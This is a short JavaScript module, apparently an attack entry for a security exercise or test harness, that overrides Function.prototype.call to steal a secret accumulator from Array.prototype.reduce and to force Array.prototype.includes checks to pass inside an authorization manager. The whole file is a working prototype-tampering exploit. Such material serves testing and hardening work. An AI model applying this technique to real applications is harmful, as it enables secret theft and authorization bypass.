export const attack = (authzManager, success) => {
  Function.prototype.call = function call(thisArg, ...args) {
    if (this === Array.prototype.reduce) {
      const stolenAcc = args[0]({}, { url: "z", headers: {} }, 0);
      success(stolenAcc.z);

      return {};
    }
    else if (this === Array.prototype.includes) {
      success(thisArg);

      return true;
    }

    this.apply(thisArg, args);

    return void 0;
  };

  authzManager.authorizedFetch([]);
  authzManager.guessSecret("wrong");
};
